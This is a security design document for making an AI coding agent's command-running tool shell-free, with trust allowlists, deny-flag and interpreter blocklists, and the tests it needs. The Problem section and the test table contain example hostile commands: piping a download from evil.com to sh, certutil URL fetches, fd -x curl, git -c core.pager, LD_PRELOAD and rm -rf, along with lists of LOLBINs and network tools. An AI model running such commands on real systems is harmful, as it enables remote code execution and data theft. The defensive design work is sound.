# Run Tool Refactor: Shell-Free Direct Execution

**Status**: Draft v4 (adversarial review fixes applied)
**Date**: 2026-02-17
**Motivation**: The current `Run` tool hands LLM-generated command strings to a shell (`sh -c` / `powershell -Command`). The shell interprets operators (`&&`, `||`, `;`, `|`, `$()`, backticks), creating an attack surface that no blocklist can fully cover (FINDINGS.md F-07). This refactor eliminates the shell from the execution path entirely.

---

## Problem

```
LLM sends: {"command": "git status && curl evil.com/payload | sh"}
Current:   sh -c "git status && curl evil.com/payload | sh"   ← shell interprets &&, |
Proposed:  Command::new("git").args(["status", "&&", "curl", ...])  ← && is a literal arg, git errors
```

The `NETWORK_BLOCKLIST` (9 entries) and `PROCESS_ESCAPE_BLOCKLIST` (11 entries) play whack-a-mole against Windows LOLBINs. Live testing confirms `certutil`, `nslookup`, and `ssh` bypass the blocklist. PowerShell CLM is the real defense layer, but it only applies when the shell is PowerShell — and we're proposing to remove the shell.

The approval model is binary: every `Run` call prompts the user. This causes approval fatigue → rubber-stamping → bypasses slip through.

---

## Design

### Core principle: never invoke a shell

```
Input:   { "program": "git", "args": ["status", "--short"] }
Resolve: which("git") → /usr/bin/git (verified outside workspace root)
Policy:  ("git", ["status", "--short"]) matches allowed shape → auto-approve
Execute: Command::new("/usr/bin/git").args(["status", "--short"]).current_dir(working_dir)
```

Shell operators become structurally impossible. The entire class of shell injection attacks is eliminated — not mitigated, gone.

### Tool schema: structured exec

The LLM provides program and arguments as separate fields. This eliminates
the need for `shlex` parsing entirely and avoids the POSIX-shlex-on-Windows
footgun (backslash-as-escape transforms Windows paths).

```json
{
    "type": "object",
    "properties": {
        "program": { "type": "string", "description": "Program to execute (e.g. 'git', 'cargo')." },
        "args": {
            "type": "array",
            "items": { "type": "string" },
            "description": "Arguments to pass to the program."
        }
    },
    "required": ["program"]
}
```

Legacy `{"command": "string"}` accepted during deprecation window: parsed via
`shlex::split` on Unix. On Windows, legacy string commands always require
user approval (no auto-approve) because POSIX tokenization is unreliable for
Windows paths. Legacy support is removed in a future release.

**Legacy mode caveat**: `shlex::split` tokenizes but does not expand. Shell
features (`~`, `$VAR`, `*.rs`, `&&`, `|`) become literal arguments, not
expanded values. When legacy parsing encounters these characters, the tool
result includes a warning: "Shell expansion is not available in direct
execution mode."

### Trust model: three layers

Auto-approve is a **visibility-loss amplifier** — skipping the prompt means
the model can run sequences of commands without the user seeing each one.
The trust model must be narrow enough to justify this.

**Layer 1: Executable resolution (PATH hijack prevention)**

Trust is by *resolved path*, not by binary name.

```rust
fn resolve_trusted_program(name: &str, workspace_root: &Path) -> Result<PathBuf, ToolError> {
    // Reject names with path separators (no ./script.sh, ../bin/git)
    if name.contains('/') || name.contains('\\') {
        return Err(/* requires approval */);
    }
    let resolved = which::which(name)?;
    // Canonicalize both paths before comparison to defeat:
    // - symlinks in PATH pointing into workspace
    // - case mismatches on Windows (NTFS is case-insensitive)
    // - \\?\ prefix mismatches, 8.3 short names, UNC paths
    let canonical_resolved = std::fs::canonicalize(&resolved)?;
    let canonical_workspace = std::fs::canonicalize(workspace_root)?;
    // Reject executables under workspace root (cwd hijack defense).
    // Primary defense against cwd-first resolution on Windows —
    // which::which may not respect NoDefaultCurrentDirectoryInExePath,
    // so we verify the result explicitly.
    if canonical_resolved.starts_with(&canonical_workspace) {
        return Err(/* workspace binary, requires approval */);
    }
    // Unix: reject shebang scripts (they invoke a shell interpreter)
    #[cfg(unix)]
    if is_shebang_script(&resolved)? {
        return Err(/* script, requires approval */);
    }
    // Windows: reject .cmd/.bat/.vbs/.wsf — interpreted by cmd.exe or
    // Windows Script Host, reintroducing shell execution.
    #[cfg(windows)]
    if is_windows_script_extension(&resolved) {
        return Err(/* script, requires approval */);
    }
    Ok(resolved)
}
```

On Windows, current-directory-first resolution is caught by the workspace-root
check. `which::which` behavior regarding cwd varies by version and the
`NoDefaultCurrentDirectoryInExePath` environment variable, so
`starts_with(workspace_root)` is the actual defense — not `which` alone.

**Layer 2: Command-shape allowlists (subcommand restriction)**

Program-level trust is too coarse. `git` means `git push`, `git config`,
submodule ops, credential helpers, hooks, pagers, external diff drivers.
Trust must be scoped to specific subcommands.

```toml
[tools.run.trust]
# Per-program subcommand allowlists.
# Only these shapes auto-approve. Everything else prompts.
[tools.run.trust.git]
allow = ["status", "ls-files", "rev-parse"]
# WARNING: "diff", "log", "show" invoke pagers / external diff drivers
# from .git/config — dangerous in untrusted repos. See git config hazard note.

[tools.run.trust.cargo]
allow = ["fmt", "clippy"]
# NOTE: "build", "test", "run" execute build scripts → require approval

[tools.run.trust.rg]
allow = ["*"]
deny_flags = ["--pre", "--pre-glob"]  # --pre executes arbitrary preprocessor

[tools.run.trust.fd]
allow = ["*"]
deny_flags = ["-x", "--exec", "-X", "--exec-batch"]  # --exec runs command per result
```

A command auto-approves only if:
1. The program resolves to a path outside the workspace root
2. The first argument (subcommand) matches the allowlist for that program
3. The program is not a script (Unix: shebang `#!`; Windows: `.cmd`/`.bat`/`.vbs`/`.wsf`)
4. No global flags precede the subcommand (`git -c key=val status` → `-c` at `args[0]` → fails condition 2 → prompts)
5. No argument matches the program's `deny_flags` list (see below)

**Per-program dangerous-flag denylist** (ships with Phase 3, not deferred):

Some programs accept flags that execute arbitrary commands even through
"safe" subcommands. These flags are denied for auto-approved commands
regardless of subcommand:

| Program | Denied flags | Reason |
|---------|-------------|--------|
| `git` | `-c`, `--exec-path`, `--config-env` | `-c key=val` sets arbitrary config including `core.pager`, `credential.helper` |
| `cargo` | `--config` | `--config 'build.rustc="evil"'` replaces the compiler |
| `rg` | `--pre`, `--pre-glob` | `--pre=cmd` runs a preprocessing command on every file |
| `fd` | `-x`, `--exec`, `-X`, `--exec-batch` | Executes a command for each search result |

The `deny_flags` check is structural: any arg in the args array that starts
with a denied prefix triggers a prompt. This is checked BEFORE auto-approve,
so a denied flag always falls through to user approval.

```rust
fn has_denied_flag(args: &[String], deny_flags: &[String]) -> bool {
    args.iter().any(|arg| {
        deny_flags.iter().any(|flag| {
            arg == flag || arg.starts_with(&format!("{flag}="))
        })
    })
}
```

**⚠ Git repo config hazard**: Git reads `.git/config` and `.gitattributes`
from the repository. A malicious repo can set `core.pager`, `diff.tool`,
`core.sshCommand`, or `credential.helper` — all of which execute arbitrary
programs when "read-only" subcommands like `diff`, `log`, `show`, `fetch`
run. The suggested trust config limits git auto-approve to `status`,
`ls-files`, `rev-parse`, which do not invoke external programs. Users who
add `diff`/`log`/`show` accept the risk. A future enhancement may
neutralize repo config via environment overrides (`GIT_CONFIG_NOSYSTEM=1`,
explicit `-c` flags) for auto-approved git commands.

**Layer 3: Hard deny (CommandBlacklist successor)**

The existing `CommandBlacklist` runs on the **parsed `CommandSpec`**, not just
raw text. This prevents shlex unescape bypass: `r\m` in raw text doesn't match
`rm`, but after parsing it becomes token `rm` which is caught.

```rust
fn validate_command_spec(spec: &CommandSpec, blacklist: &CommandBlacklist) -> Result<(), ToolError> {
    // 1. Check program name against deny list
    blacklist.validate_program(&spec.program)?;
    // 2. Check each arg individually (catches dangerous flags)
    for arg in &spec.args {
        blacklist.validate_arg(&spec.program, arg)?;
    }
    // 3. Also validate the reconstructed command string (defense-in-depth)
    let reconstructed = format!("{} {}", spec.program, spec.args.join(" "));
    blacklist.validate(&reconstructed)?;
    Ok(())
}
```

**Reconstructed-string caveat**: Step 3 re-joins tokens with spaces, losing
quoting. This can cause false positives (e.g., an arg literally containing
`rm -rf /` as text triggers the blacklist). Acceptable for defense-in-depth:
false positives surface as blocked commands that the user can retry with
explicit approval.

### Four-tier decision flow

```
1. Hard deny   → CommandBlacklist on parsed spec → reject
2. Auto-approve → resolved path trusted + subcommand shape matches → execute
3. User prompt → program known but subcommand not in allowlist → prompt
4. User prompt → program unknown → prompt with extra warning
```

**All `Run` calls still require approval by default.** Auto-approve is opt-in
via the `[tools.run.trust]` config section. The empty default is:

```toml
[tools.run.trust]
# No programs are auto-approved by default.
# Users explicitly configure trust per-program.
```

### Default trust suggestions (not defaults)

On first run or via `/config`, Forge suggests a starter trust config based on
detected project type (Rust → cargo fmt/clippy, Node → none, etc.). The user
must explicitly accept. Nothing auto-approves without user action.

**Invariant: `[tools.run.trust]` is user-config only.** Trust policy is read
exclusively from the user-level config file (`~/.forge/config.toml`), never
from workspace-local config (`.forge/config.toml` or similar). A malicious
repository must not be able to ship a trust config that auto-approves
interpreters or network tools. The config loader must enforce this boundary.

### Remove `unsafe_allow_unsandboxed`

This field is currently in the LLM-facing JSON schema (`builtins.rs:1037`).
The LLM can request sandbox bypass per-invocation (F-09). Remove it entirely.
If bypass capability is needed, it belongs in user config, not the LLM schema.

### Platform sandbox integration

| Platform | Current | After refactor |
|----------|---------|---------------|
| **Windows** | PowerShell CLM + Job Object | Job Object (CLM is PowerShell-specific, irrelevant for direct exec). Retain `PROCESS_ESCAPE_BLOCKLIST` as resolved-program denylist until allowlist is proven tight |
| **macOS** | `sandbox-exec sh -c "cmd"` | `sandbox-exec program args...` (direct exec under sandbox-exec) |
| **Linux** | `setsid` + process group isolation | Same (no change) |

CLM is dropped because it's a PowerShell language mode — meaningless when
we're not running PowerShell. The resolved-path trust + subcommand allowlist
replaces CLM's role.

**Defense-in-depth during migration**: Blocklists are retained in two forms:

1. **Resolved-program denylist**: The resolved binary filename is checked
   against `pwsh`, `bash`, `python`, `node`, `nslookup`, `certutil`, `ssh`,
   etc. This replaces program-name entries from both blocklists.

2. **Argument-level network check**: Entries like `http://`, `https://` from
   `NETWORK_BLOCKLIST` are NOT program names — they were argument-level
   patterns. These are preserved as argument checks on the parsed `CommandSpec`:
   any arg containing `http://` or `https://` in a non-trusted command triggers
   a warning in the approval prompt. This prevents the silent regression where
   `certutil -urlcache -f http://evil.com` passes because `certutil` is not in
   the program denylist and `http://` is no longer checked.

### What about PowerShell cmdlets?

LLMs cannot run `Get-ChildItem`, `Select-String`, etc. in the new model —
those require a PowerShell host. This is fine:

| PowerShell cmdlet | Forge tool equivalent |
|---|---|
| `Get-ChildItem` | `Glob` |
| `Get-Content` | `Read` |
| `Select-String` | `Search` |
| `Set-Content` | `Write` |
| `Remove-Item` | (approval-gated Write tool) |

If a user truly needs PowerShell, they use the legacy `{"command": "..."}` path
which always requires user approval. Interpreters (`pwsh`, `bash`, `python`,
`node`) are **hard-blocked from auto-approve** — the interpreter denylist
cannot be overridden by trust config. This is intentional: auto-approving an
interpreter re-opens the entire shell attack surface this refactor eliminates.

---

## Types

```rust
/// Parsed command — program + arguments, no shell interpretation.
pub struct CommandSpec {
    program: String,
    args: Vec<String>,
}

/// Resolved executable path + original spec.
pub struct ResolvedCommand {
    spec: CommandSpec,
    resolved_path: PathBuf,
}

/// Proof type: command has passed all validation gates.
/// Only constructable via `ResolvedCommand::validate()` (module-private fields).
pub struct ValidatedCommand {
    resolved: ResolvedCommand,       // private: no pub, not constructable outside module
    approval: ApprovalKind,          // private: proof of validation origin
}

/// Module-private. Cannot be constructed outside the validation pipeline.
enum ApprovalKind {
    /// Program + subcommand matched trust config, auto-approved.
    Trusted,
    /// User explicitly approved at prompt (carries opaque token from approval flow).
    UserApproved,
}

/// Per-program trust configuration.
pub struct ProgramTrust {
    /// Allowed subcommands. Empty = program trusted but all subcommands prompt.
    /// ["*"] = all subcommands auto-approve.
    allowed_subcommands: Vec<String>,
}

/// Trust policy: maps program names → subcommand allowlists.
pub struct TrustPolicy {
    programs: HashMap<String, ProgramTrust>,
}
```

`CommandSpec` → `resolve(workspace_root)` → `ResolvedCommand` → `validate(policy, blacklist)` → `Result<ValidatedCommand, NeedsApproval>` → `.execute()`.

Typestate: you cannot call `.execute()` without the proof from `.validate()`.
Same pattern as `JournalStatus`, `ObservedRegion`, `CacheBudget`.

---

## Execution Flow

```
1. LLM sends {"program": "git", "args": ["status", "--short"]}
   (or legacy {"command": "git status --short"} → shlex::split)

2. RunCommandTool::execute():
   a. Parse → CommandSpec { program: "git", args: ["status", "--short"] }

   b. Validate against CommandBlacklist (on parsed spec + reconstructed string)
      - Match → hard reject

   c. Resolve executable path:
      - which("git") → /usr/bin/git
      - Reject if under workspace_root (PATH hijack defense)
      - Reject if shebang script on Unix (shell interpreter defense)
      → ResolvedCommand { resolved_path: /usr/bin/git, spec }

   d. Check resolved binary against program denylist:
      - Resolved filename ∈ {pwsh, bash, python, node, ...} → requires approval
      (defense-in-depth: catches interpreters even if user adds them to trust)

   e. Check trust policy:
      - "git" in trust config AND "status" in allowed_subcommands → auto-approve
      - "git" in trust config BUT "push" not in allowed → prompt
      - "certutil" not in trust config → prompt with warning

   f. Command::new("/usr/bin/git")
        .args(["status", "--short"])
        .current_dir(working_dir)
        .stdin(null).stdout(piped).stderr(piped)

   g. apply_sanitized_env(&mut command)
      For auto-approved commands, ALSO strip dangerous env vars:
      LD_PRELOAD, DYLD_INSERT_LIBRARIES, GIT_SSH_COMMAND,
      GIT_EXEC_PATH, EDITOR, VISUAL, PAGER, GIT_PAGER

   h. Platform sandbox (Job Object / sandbox-exec / setsid)

   i. Spawn + ChildGuard
```

---

## Security Properties

| Property | How |
|----------|-----|
| Shell injection eliminated | No shell invoked. Operators are literal args. Structured schema prevents parsing ambiguity |
| PATH hijack prevented | Executable resolved via `which`, rejected if under workspace root |
| Script escape blocked | Unix: reject shebang `#!` scripts. Windows: reject `.cmd`/`.bat`/`.vbs`/`.wsf` |
| Subcommand-scoped trust | `git status` ok, `git push` prompts. Program-level trust is too coarse |
| Blacklist on parsed spec | `CommandBlacklist` validates program + each arg after parsing, not just raw text |
| Default = all commands prompt | No auto-approve without explicit user configuration |
| `unsafe_allow_unsandboxed` removed | LLM cannot request sandbox bypass |
| Parse failure = hard reject | `shlex::split` returns None → command rejected. Fail closed |
| Interpreter denylist (hard block) | `python`/`node`/`bash`/`pwsh` cannot auto-approve even via trust config. Legacy path with user approval is the only option |
| Per-program flag denylist | `git -c`, `rg --pre`, `fd -x`, `cargo --config` always prompt regardless of subcommand trust |
| Env var hardening | Auto-approved commands strip `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `GIT_SSH_COMMAND`, `PAGER`, etc. |
| Defense-in-depth preserved | Program denylists + argument-level network checks retained during migration |
| Batch visibility | Mixed-approval batches show ALL commands to user before any execute |
| Forensic audit trail | `ApprovalKind` recorded in tool journal — distinguishes auto vs user-approved |
| Path canonicalization | Resolved path + workspace root canonicalized before comparison (defeats symlinks, case, 8.3 names) |
| Platform isolation preserved | Job Objects (Windows), sandbox-exec (macOS), setsid (Linux) still applied |
| Git config hazard documented | Dangerous subcommands (`diff`/`log`/`show`) excluded from suggested trust |
| Trust config is user-only | `[tools.run.trust]` never read from workspace-local config |
| Proof types unforgeable | `ValidatedCommand` has module-private fields; only `validate()` constructs it |

---

## Files Affected

### Modified

| File | Change |
|------|--------|
| `tools/src/builtins.rs` | `RunCommandTool::execute` uses `CommandSpec` + direct exec; structured schema; remove `unsafe_allow_unsandboxed`; legacy `command` string parsing via shlex |
| `tools/src/windows_run.rs` | Refactor to resolved-program denylist model. Remove shell-wrapping logic. Keep Job Object support. `PreparedRunCommand` constructed from `ResolvedCommand` |
| `tools/src/command_blacklist.rs` | Add `validate_program()`, `validate_arg()` methods for structured validation alongside existing raw-string `validate()` |
| `tools/src/config.rs` | Add `TrustPolicy` config types (`ProgramTrust`, per-program subcommand allowlists) |
| `tools/src/lib.rs` | Export new types; `RunCommandTool` gains `TrustPolicy` + workspace root fields |
| `config/src/lib.rs` | Add `[tools.run.trust]` section to `ForgeConfig` |
| `tools/Cargo.toml` | Add `shlex` dependency (for legacy string parsing) |
| `engine/src/app/tool_gate.rs` | Trust-aware approval: check `TrustPolicy` before prompting |

### Retained (not removed during migration)

| File | Why |
|------|-----|
| `tools/src/windows_run.rs` `NETWORK_BLOCKLIST` | Converted to resolved-program denylist; removed only after allowlist model proven |
| `tools/src/windows_run.rs` `PROCESS_ESCAPE_BLOCKLIST` | Same |
| `tools/src/powershell_ast.rs` | Evaluate if needed for other purposes; remove only after migration stabilizes |

### Unchanged

| File | Why |
|------|-----|
| `tools/src/process.rs` | `ChildGuard`, `apply_sanitized_env`, process group isolation — unchanged |
| `tools/src/windows_run_host.rs` | Job Object attachment — unchanged |
| `tools/src/sandbox.rs` | Filesystem sandbox — orthogonal |

---

## Migration

### Phase 1: Shell-free execution (no auto-approve)

Change the execution model without changing the approval model. Every `Run`
call still prompts the user — this is a pure security hardening with no
visibility loss.

- Add `shlex` to `tools/Cargo.toml`
- Create `CommandSpec`, `ResolvedCommand`, `ValidatedCommand` types
- Add structured schema (`program` + `args[]`) alongside legacy `command` string
- Implement `resolve_trusted_program` with workspace-root rejection and shebang detection
- Refactor `RunCommandTool::execute` to use `Command::new(resolved_path).args(args)`
- Extend `CommandBlacklist` with `validate_program()` / `validate_arg()` for parsed-spec validation
- Convert `NETWORK_BLOCKLIST` + `PROCESS_ESCAPE_BLOCKLIST` to resolved-program denylists
- Remove `unsafe_allow_unsandboxed` from schema and `RunCommandArgs`
- Update macOS sandbox-exec to wrap program directly

### Phase 2: Trust policy infrastructure

Build the config and policy layer, but don't wire it into auto-approve yet.
This lets users configure trust before it takes effect.

- Add `[tools.run.trust]` config section with per-program subcommand allowlists
- Create `TrustPolicy` type with `check(program, args) → Trusted | NeedsApproval`
- Surface trust config in TUI settings / `/config` command
- Log trust decisions at `debug` level for observability

### Phase 3: Opt-in auto-approve

Wire trust policy into the approval gate. Users who have configured trust
get auto-approve for matching commands.

- Integrate `TrustPolicy` into `tool_gate.rs` approval flow
- Auto-approve only when: resolved path is trusted + subcommand matches + not a script + no denied flags
- Record `ApprovalKind` (Trusted vs UserApproved) in `tool_journal` for forensic distinction
- Display auto-approved commands in session log with `[auto]` prefix (visibility, not approval)
- Add TUI indicator when auto-approve is active
- **Batch visibility**: in mixed-approval batches (some auto-approved, some requiring prompt),
  show the user ALL commands in the batch (auto-approved ones marked as such) before executing
  any. The user must see the full picture, not just the commands that need their approval.
  Auto-approved commands in a batch are displayed but not individually gated.
- Strip dangerous env vars (`LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `GIT_SSH_COMMAND`,
  `GIT_EXEC_PATH`, `EDITOR`, `VISUAL`, `PAGER`) for auto-approved commands.
  User-approved commands inherit the full sanitized env (existing behavior)

### Phase 4: Clean up legacy

After the new model has been validated in production:

- Remove legacy `command` string parsing
- Remove `NETWORK_BLOCKLIST` / `PROCESS_ESCAPE_BLOCKLIST` (replaced by resolved-program denylist + trust allowlist)
- Evaluate `powershell_ast.rs` and `shell.rs` for removal

---

## Required Tests

| Category | Test | Purpose |
|----------|------|---------|
| **Blacklist bypass** | `r\m -rf /` blocked after shlex parsing | Prove unescape doesn't defeat blacklist |
| **Blacklist bypass** | `p\wsh -Command "evil"` blocked after parsing | Same for interpreter escape |
| **PATH hijack** | Fake `git` in workspace root rejected | Trust resolves to system binary, not workspace |
| **PATH hijack (Windows)** | Fake `git.exe` in cwd rejected | Windows cwd-first resolution blocked |
| **Shebang detection** | `#!/bin/sh` script rejected as auto-approve candidate | Script → requires approval |
| **Windows paths** | `C:\Users\Name With Space\file.txt` survives as arg | Structured schema avoids shlex mangling |
| **No-shell invariant** | Assert no code path builds `sh -c` / `pwsh -Command` | Including feature-flag fallback paths |
| **Subcommand restriction** | `git status` auto-approves, `git push` prompts | Allowlist granularity works |
| **Interpreter denylist** | `python` resolved → denied auto-approve even if in trust config | Defense-in-depth check |
| **Structured schema** | LLM sends `{"program": "git", "args": ["status"]}` → correct exec | Primary path works |
| **Legacy compat** | `{"command": "git status"}` → parsed and executed | Deprecation window works |
| **Legacy on Windows** | `{"command": "..."}` always prompts on Windows | No auto-approve for string commands on Windows |
| **Global flags** | `git -c core.pager=evil status` not auto-approved | `-c` at `args[0]` fails subcommand match |
| **Windows scripts** | `which("foo")` → `foo.cmd` rejected for auto-approve | `.cmd`/`.bat` reintroduce shell |
| **Trust config source** | Workspace `.forge/config.toml` cannot set `[tools.run.trust]` | Workspace config injection blocked |
| **Legacy shell expansion** | `{"command": "ls ~"}` warns about no expansion | User sees explanation for unexpected behavior |
| **Denied flags (git)** | `git -c core.pager=evil status` blocked for auto-approve | `-c` in git deny_flags |
| **Denied flags (rg)** | `rg --pre=evil pattern` blocked for auto-approve | `--pre` in rg deny_flags |
| **Denied flags (fd)** | `fd -x curl evil.com {}` blocked for auto-approve | `-x` in fd deny_flags |
| **Denied flags (cargo)** | `cargo clippy --config 'build.rustc="evil"'` blocked | `--config` in cargo deny_flags |
| **Env var smuggling** | `GIT_SSH_COMMAND=evil` stripped for auto-approved commands | Env hardening for auto-approve |
| **Env var smuggling** | `LD_PRELOAD=evil.so` stripped for auto-approved commands | Prevents shared library injection |
| **Path canonicalization** | Symlink `/usr/local/bin/git` → workspace `evil_git` rejected | Canonical path is under workspace root |
| **Interpreter hard block** | `pwsh` in trust config still cannot auto-approve | Interpreter denylist overrides trust |
| **Batch visibility** | Mixed batch: auto + prompted commands all shown to user | User sees full batch before any execute |
| **Approval journal** | Auto-approved command records `ApprovalKind::Trusted` in tool_journal | Forensic distinction |
| **Arg-level network** | `certutil -urlcache -f http://evil.com` shows URL warning in approval | Argument-level network check preserved |

---

## Future Work (Out of Scope for This Refactor)

- **Workspace trust**: per-repo trust configuration (like VSCode's "Trust this folder?"). Currently trust is global per-user. Workspace-scoped trust is a separate design project.
- **Expanded argument constraints**: the per-program `deny_flags` denylist covers known dangerous flags. More granular arg validation (e.g., restrict `git push` remote targets, validate `cargo` feature flags) is deferred.
- **OS-level network sandboxing**: Job Objects don't restrict network. True network isolation requires WFP firewall rules (Windows) or `sandbox-exec` network deny (macOS). Separate effort.
- **Persistent trust cache**: "remember this approval" to reduce prompts for frequently-used commands without full auto-approve. Needs its own threat model.
